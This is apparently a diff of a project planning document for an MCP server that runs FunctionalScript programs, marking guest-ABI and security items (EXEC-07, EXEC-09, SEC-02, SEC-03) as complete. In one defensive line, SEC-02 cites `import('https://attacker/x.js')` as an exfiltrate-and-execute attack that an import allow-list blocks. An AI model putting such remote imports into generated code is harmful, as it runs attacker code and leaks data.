@@ -142,7 +142,7 @@ dissolves on contact.
 - [x] **EXEC-06** *(T0)*: A step budget bounds execution. `asyncRun` is an unbounded
       `while(true)`; a generated loop with a wrong termination condition otherwise hangs
       the single-process server silently, with no response and no way to cancel.
-- [ ] **EXEC-07** *(T0)*: A frozen guest ABI. Two constraints fix its shape:
+- [x] **EXEC-07** *(T0)*: A frozen guest ABI. Two constraints fix its shape:
       - **The entry point is a distinct export, not `main`, typed
         `(args) => Effect<CasOp, T>`** — resolving `todo/plan.md` open question 6. fjs
         names entry points by role (`proof` for tests, `main` for Node CLI programs), so a
@@ -166,7 +166,7 @@ dissolves on contact.
 - [ ] **EXEC-08** *(T1)*: An `fjs_run` MCP tool taking `{ hash, args?, subject?, parents? }`
       — **pinned inputs, not just a program hash.** Evo heads resolve at read time, so a
       program that resolves its own heads is not reproducible.
-- [ ] **EXEC-09** *(T1)*: `fjs_run` reaches `import()` through the `import_` **effect**, not
+- [x] **EXEC-09** *(T1)*: `fjs_run` reaches `import()` through the `import_` **effect**, not
       a raw expression, making it proof-testable under `fjs/effects/node/virtual` with no
       filesystem.
 - [ ] **EXEC-10** *(T1)*: The **tool handler** writes the result and run record to CAS —
@@ -352,10 +352,10 @@ would be materially more expensive to retrofit.
 - [x] **SEC-01** *(T0)*: The registered `claude mcp add` launcher carries
       `node --permission` with scoped `--allow-fs-*` from the **first** registration.
       Registering later means the unsafe configuration is the one everyone already has.
-- [ ] **SEC-02** *(T1)*: A textual import-specifier allow-list enforced before a program is
+- [x] **SEC-02** *(T1)*: A textual import-specifier allow-list enforced before a program is
       materialized — roughly 20 lines, and it closes the
       `import('https://attacker/x.js')` exfiltrate-and-execute variant entirely.
-- [ ] **SEC-03** *(T1)*: Programs materialized under **content-hash-derived filenames**. The
+- [x] **SEC-03** *(T1)*: Programs materialized under **content-hash-derived filenames**. The
       ESM cache is keyed by URL and never evicts, so a reused temp filename silently re-runs
       the *first* program.
 - [x] **SEC-04** *(T0)*: ~~An upstream bug report to FunctionalScript for the `match`
@@ -452,9 +452,9 @@ them. Week 0 is research's addition in front of the plan's Week 1.
 | EXEC-04 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
 | EXEC-05 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
 | EXEC-06 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
-| EXEC-07 | T0 | Phase 6 - Guest ABI and Materialization | Week 1 | Pending |
+| EXEC-07 | T0 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
 | EXEC-08 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
-| EXEC-09 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Pending |
+| EXEC-09 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
 | EXEC-10 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
 | EXEC-11 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
 | EXEC-12 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
@@ -508,8 +508,8 @@ them. Week 0 is research's addition in front of the plan's Week 1.
 | PROV-07 | T2 | Phase 9 - Traceable Report Lines | Week 2 | Pending |
 | PROV-08 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Pending |
 | SEC-01 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
-| SEC-02 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Pending |
-| SEC-03 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Pending |
+| SEC-02 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
+| SEC-03 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
 | SEC-04 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
 
 ### Coverage by phase
